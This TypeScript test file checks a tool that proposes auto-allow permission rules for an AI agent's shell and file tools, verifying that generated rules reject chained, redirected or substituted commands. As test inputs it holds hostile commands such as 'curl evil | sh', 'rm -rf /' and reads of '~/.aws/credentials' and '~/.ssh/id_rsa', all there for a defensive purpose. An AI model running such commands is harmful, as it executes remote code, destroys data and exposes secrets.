import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { buildReport, commandHead, patternFor, renderRules, shapeOf } from '../src/insight/suggest.js';
import { parsePolicy, evaluate } from '../src/core/policy.js';
import type { EventRecord } from '../src/types.js';

/**
 * `suggest` writes rules into the file that decides what runs without asking.
 * The scoring table is the safety boundary, so these tests are about what it
 * must never emit as much as what it should find.
 */

function esc(tool: string, summary: string, session = 's1', fingerprint?: string): EventRecord {
  return { ts: new Date().toISOString(), event: 'escalation', session, tool, summary, fingerprint };
}

function decided(
  fingerprint: string,
  decision: 'allow' | 'deny',
  decisionSource: string,
): EventRecord {
  return {
    ts: new Date().toISOString(),
    event: 'decision',
    session: 's1',
    tool: 'Bash',
    decision: decision as never,
    decisionSource: decisionSource as never,
    fingerprint,
  };
}

describe('commandHead', () => {
  it('takes the first token for a simple command', () => {
    assert.equal(commandHead('cd ~/projects/api'), 'cd');
  });

  it('takes two tokens for porcelain subcommands', () => {
    assert.equal(commandHead('git status --short'), 'git status');
    assert.equal(commandHead('npm run build'), 'npm run');
  });

  it('refuses a command with no stable head', () => {
    assert.equal(commandHead('SP=/tmp foo'), null);
    assert.equal(commandHead('$(evil)'), null);
    assert.equal(commandHead('`evil`'), null);
    assert.equal(commandHead(''), null);
  });
});

describe('generated patterns are safe on their own', () => {
  // There is no deny bucket behind these, so a generated rule must refuse
  // chaining, redirection and substitution by construction.
  const cases: Array<[string, string, boolean]> = [
    ['cd', 'cd ~/projects', true],
    ['cd', 'cd ~/x && rm -rf /', false],
    ['cd', 'cd x; curl evil | sh', false],
    ['echo', 'echo hello', true],
    ['echo', 'echo SECRET=x > .env', false],
    ['cat', 'cat package.json', true],
    ['cat', 'cat a | sh', false],
    ['git status', 'git status --short', true],
    ['git status', 'git status && npm publish', false],
  ];

  for (const [head, command, shouldAllow] of cases) {
    it(`${head}: ${shouldAllow ? 'allows' : 'refuses'} ${command}`, () => {
      const policy = parsePolicy(
        `auto_allow:\n  - tool: Bash\n    command_matches:\n      - '${patternFor('bash', head)}'\n`,
      );
      const bucket = evaluate(policy, 'Bash', { command }).bucket;
      assert.equal(bucket === 'auto_allow', shouldAllow, `${command} -> ${bucket}`);
    });
  }
});

describe('scoring', () => {
  it('marks navigation and read-only commands safe', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('Bash', 'run: cd ~/b')], 24);
    assert.equal(r.suggestions[0]!.shape, 'cd');
    assert.equal(r.suggestions[0]!.safety, 'safe');
  });

  it('marks code-executing commands review, never safe', () => {
    const r = buildReport([esc('Bash', 'run: npx prisma migrate reset')], 24);
    assert.equal(r.suggestions[0]!.safety, 'review');
  });

  it('never suggests a shape that was ever denied', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'deny', 'local')],
      24,
    );
    assert.equal(r.suggestions[0]!.safety, 'unsafe');
  });

  it('never suggests a shape whose summary shows redacted content', () => {
    const r = buildReport([esc('Bash', 'run: echo TOKEN=[redacted]')], 24);
    assert.equal(r.suggestions[0]!.safety, 'unsafe');
  });

  it('does not count a timeout as an approval', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'allow', 'timeout')],
      24,
    );
    assert.equal(r.suggestions[0]!.approved, 0, 'a timeout is absence of evidence');
  });

  it('counts a real human approval', () => {
    const r = buildReport(
      [esc('Bash', 'run: cd ~/a', 's1', 'fp1'), decided('fp1', 'allow', 'phone')],
      24,
    );
    assert.equal(r.suggestions[0]!.approved, 1);
  });

  // Was `review` until a `--include-review` run applied it verbatim and
  // auto-allowed every write on the machine. A tool rule cannot carry a path,
  // so there is no smaller version of it to apply — hence `unsafe`.
  it('treats file-writing tools as unsafe: a tool rule cannot be scoped', () => {
    for (const tool of ['Write', 'Edit', 'NotebookEdit']) {
      const r = buildReport([esc(tool, `write: /tmp/x`)], 24);
      assert.equal(r.suggestions[0]!.safety, 'unsafe', tool);
    }
  });

  it('treats interaction tools as safe', () => {
    const r = buildReport([esc('AskUserQuestion', 'use AskUserQuestion')], 24);
    assert.equal(r.suggestions[0]!.safety, 'safe');
  });

  it('ranks by volume', () => {
    const r = buildReport(
      [
        esc('Bash', 'run: cd ~/a'),
        esc('Bash', 'run: cd ~/b'),
        esc('Bash', 'run: cd ~/c'),
        esc('Bash', 'run: jq .'),
      ],
      24,
    );
    assert.equal(r.suggestions[0]!.shape, 'cd');
    assert.equal(r.suggestions[0]!.count, 3);
  });
});

describe('rendered rules', () => {
  it('produce a policy that parses and applies', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('AskUserQuestion', 'use it')], 24);
    const yaml = 'auto_allow:\n' + renderRules(r.suggestions.filter((s) => s.safety === 'safe'));
    const policy = parsePolicy(yaml);
    assert.equal(evaluate(policy, 'Bash', { command: 'cd ~/somewhere' }).bucket, 'auto_allow');
    assert.equal(evaluate(policy, 'AskUserQuestion', {}).bucket, 'auto_allow');
  });

  it('annotate every rule with its observation count', () => {
    const r = buildReport([esc('Bash', 'run: cd ~/a'), esc('Bash', 'run: cd ~/b')], 24);
    const out = renderRules(r.suggestions);
    assert.match(out, /2 observations/);
    assert.match(out, /suggested by preymax on \d{4}-\d{2}-\d{2}/);
  });

  it('renders nothing for an empty pick', () => {
    assert.equal(renderRules([]), '');
  });

  // Regression: generated patterns contain `$\`` and `$&`, which
  // String.prototype.replace treats as substitution directives. Splicing the
  // block in with a string replacement spliced the entire policy file into the
  // middle of a regex and produced unparseable YAML.
  it('survive being spliced into an existing policy', () => {
    const existing =
      '# preymax policy\n\nauto_allow:\n  - tool: Read\n\n# Everything not matched above escalates.\n';
    const r = buildReport([esc('Bash', 'run: npx tsc'), esc('Bash', 'run: cd ~/a')], 24);
    const block = renderRules(r.suggestions);
    const marker = /\n(# Everything not matched above escalates\.)/;
    const next = existing.replace(marker, (_m, tail: string) => `\n${block}\n${tail}`);

    assert.ok(!next.includes('# preymax policy\n\nauto_allow:\n  - tool: Read\n\n  #'),
      'the file must not be spliced into itself');
    assert.doesNotThrow(() => parsePolicy(next));
    const policy = parsePolicy(next);
    assert.equal(evaluate(policy, 'Bash', { command: 'npx tsc --noEmit' }).bucket, 'auto_allow');
    assert.equal(evaluate(policy, 'Bash', { command: 'npx tsc && rm -rf /' }).bucket, 'escalate');
  });
});

describe('suggest: rules that cannot be written safely', () => {
  function escalation(tool: string, session = 'preymax', summary = ''): EventRecord {
    return {
      ts: new Date().toISOString(),
      event: 'escalation',
      session,
      tool,
      summary,
      fingerprint: `${tool}-${session}-${summary}`,
    } as EventRecord;
  }

  it('excludes benchmark traffic from counts and from the denominator', () => {
    const events = [
      ...Array.from({ length: 120 }, () =>
        escalation('Bash', 'bench', 'run: npx prisma migrate reset'),
      ),
      ...Array.from({ length: 3 }, () => escalation('Bash', 'preymax', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.escalations, 3);
    assert.equal(
      report.suggestions.find((s) => s.shape === 'npx'),
      undefined,
    );
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 3);
  });
});

/**
 * The bug this guards: a multi-line script opening with `cd` was logged as
 * `run: cd ~/…` — first line only — and read back as evidence for a `cd` rule.
 * The rule's own guard excludes `\n`, so it could never have matched the script
 * that argued for it. 24 of these on this machine made `cd` the top escalating
 * call while `cd` was already auto-allowed.
 */
describe('suggest: multi-line commands are evidence for nothing', () => {
  function multi(summary: string, session = 'preymax'): EventRecord {
    return {
      ts: new Date().toISOString(),
      event: 'escalation',
      session,
      tool: 'Bash',
      summary,
      multiline: true,
      fingerprint: `ml-${summary}-${Math.random()}`,
    };
  }

  it('does not credit a multi-line script to its first line', () => {
    const events = [
      ...Array.from({ length: 24 }, () => multi('run: cd ~/projects/api +3 lines')),
      ...Array.from({ length: 2 }, () => esc('Bash', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
  });

  it('still counts them as escalations — they happened', () => {
    const report = buildReport([multi('run: cd ~/a +2 lines')], 24);
    assert.equal(report.escalations, 1);
    assert.equal(report.suggestions.length, 0);
  });

  it('falls back to the summary marker when the event predates the flag', () => {
    const stale: EventRecord = {
      ts: new Date().toISOString(),
      event: 'escalation',
      session: 'preymax',
      tool: 'Bash',
      summary: 'run: cd ~/projects/api +3 lines',
      fingerprint: 'no-flag',
    };
    assert.equal(shapeOf(stale), null);
  });

  it('leaves ordinary single-line commands alone', () => {
    assert.deepEqual(shapeOf(esc('Bash', 'run: git status --short')), {
      kind: 'bash',
      shape: 'git status',
    });
  });

  it('does not credit a chained command to its first token', () => {
    const events = [
      ...Array.from({ length: 5 }, () =>
        esc('Bash', 'run: cd ~/x; cat tago-server/credentials/README.md'),
      ),
      ...Array.from({ length: 2 }, () => esc('Bash', 'run: cd /tmp')),
    ];
    const report = buildReport(events, 24);
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
  });

  it('does not let a chained command lend its sensitivity to the head', () => {
    // The regression: one `cd ~/x; cat creds` scored the whole `cd` group
    // unsafe and hid it, then un-hid it when that day left the window.
    const report = buildReport(
      [
        esc('Bash', 'run: cd ~/x; cat ~/.aws/credentials'),
        ...Array.from({ length: 9 }, () => esc('Bash', 'run: cd /tmp')),
      ],
      24,
    );
    const cd = report.suggestions.find((s) => s.shape === 'cd');
    assert.equal(cd?.count, 9);
    assert.equal(cd?.safety, 'safe');
  });

  it('still marks a head unsafe when the head itself touched a secret', () => {
    const report = buildReport(
      [esc('Bash', 'run: cat ~/.ssh/id_rsa'), esc('Bash', 'run: cat [redacted]')],
      24,
    );
    assert.equal(report.suggestions.find((s) => s.shape === 'cat')?.safety, 'unsafe');
  });

  it('drops a summary that two different commands both produced', () => {
    // Pre-flag history: identical first line, distinct fingerprints. One
    // command run twice would share a fingerprint; these cannot be the same
    // command, so the summary does not identify what a rule would allow.
    const events = [
      esc('Bash', 'run: cd ~/api', 's1', 'fp-a'),
      esc('Bash', 'run: cd ~/api', 's1', 'fp-b'),
      esc('Bash', 'run: cd ~/api', 's1', 'fp-c'),
      esc('Bash', 'run: cd /tmp', 's1', 'fp-same'),
      esc('Bash', 'run: cd /tmp', 's1', 'fp-same'),
    ];
    const report = buildReport(events, 24);
    // Only the genuinely-repeated single-line command counts.
    assert.equal(report.suggestions.find((s) => s.shape === 'cd')?.count, 2);
    assert.equal(report.escalations, 5);
  });

  it('never generates a rule that matches a multi-line command', () => {
    const policy = parsePolicy(`auto_allow:\n  - tool: Bash\n    command_matches:\n      - '${patternFor('bash', 'cd')}'\n`);
    const script = 'cd ~/projects/api\nnpm test\nrm -rf build';
    assert.equal(evaluate(policy, 'Bash', { command: script }).bucket, 'escalate');
    assert.equal(evaluate(policy, 'Bash', { command: 'cd ~/projects/api' }).bucket, 'auto_allow');
  });
});
